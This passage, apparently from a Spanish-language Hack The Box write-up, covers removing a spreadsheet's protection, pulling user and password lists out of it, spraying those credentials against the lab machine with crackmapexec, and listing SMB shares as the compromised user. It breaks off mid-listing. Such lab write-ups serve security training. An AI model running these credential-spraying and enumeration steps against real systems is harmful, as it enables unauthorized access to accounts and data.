class="nv">r</span><span class="o">=</span><span class="s2">"C7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;37&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Eliezer.Jordan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"8"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;16&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;17&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;38&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D8:D15"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>A8&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B8&lt;/f&gt;&lt;v&gt;Hunter.Kirby&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;29&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;30&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C9"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;48&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D9"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f&gt;A9&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B9&lt;/f&gt;&lt;v&gt;Sierra.Frye&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"10"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;18&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;19&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C10"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;39&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D10"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Annabelle.Wells&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"11"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;20&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;21&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;40&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D11"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Eve.Galvan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"12"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;22&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;23&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;41&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D12"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Jeramiah.Fritz&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"13"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;24&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;25&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;42&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D13"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Abby.Gonzalez&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"14"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;26&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;11&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;43&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D14"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Joy.Costa&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"15"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;27&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;28&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;47&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D15"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;v&gt;Vincent.Sutton&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"17"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"3:3"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C17"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"4"</span>/&gt;&lt;/row&gt;&lt;/sheetData&gt;&lt;pageMargins <span class="nv">left</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">right</span><span class="o">=</span><span class="s2">"0.7"</span> <span class="nv">top</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">bottom</span><span class="o">=</span><span class="s2">"0.75"</span> <span class="nv">header</span><span class="o">=</span><span class="s2">"0.3"</span> <span class="nv">footer</span><span class="o">=</span><span class="s2">"0.3"</span>/&gt;&lt;pageSetup <span class="nv">paperSize</span><span class="o">=</span><span class="s2">"9"</span> <span class="nv">orientation</span><span class="o">=</span><span class="s2">"portrait"</span> r:id<span class="o">=</span><span class="s2">"rId1"</span>/&gt;&lt;/worksheet&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora generamos otro comprimido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document <span class="nb">rm</span> <span class="nt">-r</span> Phishing_Attempt.xlsx
+➜  document zip Docu.xlsx <span class="nt">-r</span> <span class="nb">.</span>
+  adding: _rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: _rels/.rels <span class="o">(</span>deflated 60%<span class="o">)</span>
+  adding: xl/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/_rels/workbook.xml.rels <span class="o">(</span>deflated 74%<span class="o">)</span>
+  adding: xl/drawings/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/drawings/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/drawings/_rels/drawing1.xml.rels <span class="o">(</span>deflated 39%<span class="o">)</span>
+  adding: xl/drawings/drawing1.xml <span class="o">(</span>deflated 58%<span class="o">)</span>
+  adding: xl/worksheets/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/worksheets/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/worksheets/_rels/sheet2.xml.rels <span class="o">(</span>deflated 42%<span class="o">)</span>
+  adding: xl/worksheets/_rels/sheet1.xml.rels <span class="o">(</span>deflated 55%<span class="o">)</span>
+  adding: xl/worksheets/sheet2.xml <span class="o">(</span>deflated 73%<span class="o">)</span>
+  adding: xl/worksheets/sheet1.xml <span class="o">(</span>deflated 79%<span class="o">)</span>
+  adding: xl/workbook.xml <span class="o">(</span>deflated 60%<span class="o">)</span>
+  adding: xl/styles.xml <span class="o">(</span>deflated 89%<span class="o">)</span>
+  adding: xl/printerSettings/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/printerSettings/printerSettings1.bin <span class="o">(</span>deflated 67%<span class="o">)</span>
+  adding: xl/printerSettings/printerSettings2.bin <span class="o">(</span>deflated 67%<span class="o">)</span>
+  adding: xl/sharedStrings.xml <span class="o">(</span>deflated 55%<span class="o">)</span>
+  adding: xl/charts/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/charts/_rels/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/charts/_rels/chart1.xml.rels <span class="o">(</span>deflated 49%<span class="o">)</span>
+  adding: xl/charts/style1.xml <span class="o">(</span>deflated 90%<span class="o">)</span>
+  adding: xl/charts/chart1.xml <span class="o">(</span>deflated 77%<span class="o">)</span>
+  adding: xl/charts/colors1.xml <span class="o">(</span>deflated 73%<span class="o">)</span>
+  adding: xl/theme/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: xl/theme/theme1.xml <span class="o">(</span>deflated 80%<span class="o">)</span>
+  adding: xl/calcChain.xml <span class="o">(</span>deflated 55%<span class="o">)</span>
+  adding: <span class="o">[</span>Content_Types].xml <span class="o">(</span>deflated 79%<span class="o">)</span>
+  adding: docProps/ <span class="o">(</span>stored 0%<span class="o">)</span>
+  adding: docProps/app.xml <span class="o">(</span>deflated 52%<span class="o">)</span>
+  adding: docProps/core.xml <span class="o">(</span>deflated 47%<span class="o">)</span>
+  adding: .~lock.Phishing_Attempt.xlsx# <span class="o">(</span>deflated 1%<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Ahora lo abrimos de nuevo.</p>
+  </li>
+  <li>
+    <p>Y vemos que ya no tenemos el candado.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/9.png" />
+</p>
+
+<ul>
+  <li>Las contraseñas están en la <strong>C</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/10.png" />
+</p>
+
+<ul>
+  <li>Tenemos un listado potencial de usuarios y contraseñas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new <span class="nb">cat </span>users.txt
+Payton.Harmon
+Cortez.Hickman
+Bobby.Wolf
+Margaret.Robinson
+Scarlett.Parks
+Eliezer.Jordan
+Hunter.Kirby
+Sierra.Frye
+Annabelle.Wells
+Eve.Galvan
+Jeramiah.Fritz
+Abby.Gonzalez
+Joy.Costa
+Vincent.Sutton
+➜  new nano creds.txt
+➜  new <span class="nb">cat </span>creds.txt
+<span class="p">;;</span>36!cried!INDIA!year!50<span class="p">;;</span>
+..10-time-TALK-proud-66..
+??47^before^WORLD^surprise^91??
+//51+mountain+DEAR+noise+83//
+++47|building|WARSAW|gave|60++
+<span class="o">!!</span>05_goes_SEVEN_offer_83!!
+~~27%when%VILLAGE%full%00~~
+<span class="nv">$$49</span><span class="o">=</span><span class="nv">wide</span><span class="o">=</span><span class="nv">STRAIGHT</span><span class="o">=</span><span class="nv">jordan</span><span class="o">=</span>28<span class="nv">$$</span>18
+<span class="o">==</span>95~pass~QUIET~austria~77<span class="o">==</span>
+//61!banker!FANCY!measure!25//
+??40:student:MAYOR:been:66??
+<span class="o">&amp;&amp;</span>75:major:RADIO:state:93&amp;&amp;
+<span class="k">**</span>30<span class="k">*</span>venus<span class="k">*</span>BALL<span class="k">*</span>office<span class="k">*</span>42<span class="k">**</span>
+<span class="k">**</span>24&amp;moment&amp;BRAZIL&amp;members&amp;66<span class="k">**</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> pero vamos hacer que para cada usuario pruebe la contraseña tipo primero la 1 primer contraseña del archivo para el primer usuario después para el segundo usuario la 2 contraseña de la lista etc. Tenemos que indicarle el siguiente parámetro <code class="language-plaintext highlighter-rouge">--no-bruteforce</code> para que no vaya probando 1 contraseña para todos los usuarios y a si sucesivamente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  new crackmapexec smb 10.129.229.57 <span class="nt">-u</span> users.txt <span class="nt">-p</span> creds.txt <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span>
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\P</span>ayton.Harmon:<span class="p">;;</span>36!cried!INDIA!year!50<span class="p">;;</span> STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>ortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\B</span>obby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>argaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>carlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>liezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\H</span>unter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\S</span>ierra.Frye:<span class="nv">$$49</span><span class="o">=</span><span class="nv">wide</span><span class="o">=</span><span class="nv">STRAIGHT</span><span class="o">=</span><span class="nv">jordan</span><span class="o">=</span>28<span class="nv">$$</span>18
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>nnabelle.Wells:<span class="o">==</span>95~pass~QUIET~austria~77<span class="o">==</span> STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>ve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>eramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>bby.Gonzalez:&amp;&amp;75:major:RADIO:state:93&amp;&amp; STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>oy.Costa:<span class="k">**</span>30<span class="k">*</span>venus<span class="k">*</span>BALL<span class="k">*</span>office<span class="k">*</span>42<span class="k">**</span> STATUS_LOGON_FAILURE
+SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\V</span>incent.Sutton:<span class="k">**</span>24&amp;moment&amp;BRAZIL&amp;members&amp;66<span class="k">**</span> STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<h2 id="shell-as-sierrafrye">Shell as sierra.frye</h2>
+
+<ul>
+  <li>Vamos a validarlas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb search.htb <span class="nt">-u</span> Sierra.Frye <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--continue-on-success</span>
+SMB         search.htb      445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\S</span>ierra.Frye:<span class="nv">$$49</span><span class="o">=</span><span class="nv">wide</span><span class="o">=</span><span class="nv">STRAIGHT</span><span class="o">=</span><span class="nv">jordan</span><span class="o">=</span>28<span class="nv">$$</span>18
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a listar recursos pero ahora con este usuario.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	NO ACCESS	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	NO ACCESS	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	./RedirectedFolders<span class="err">$</span>
+	dr--r--r--                0 Sun Apr  7 17:54:11 2024	<span class="nb">.</span>
+	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
+	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
+	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
+	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
+	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
+	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
+	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
+	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
+	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
+	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
+	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
+	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
+	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
+	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
+	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
+	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
+	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
+	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
+	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
+	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
+	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
+	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
+	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
+	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	NO ACCESS	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	./RedirectedFolders<span class="err">$</span>
+	dr--r--r--                0 Sun Apr  7 17:54:11 2024	<span class="nb">.</span>
+	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
+	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
+	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
+	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
+	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
+	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
+	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
+	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
+	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
+	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
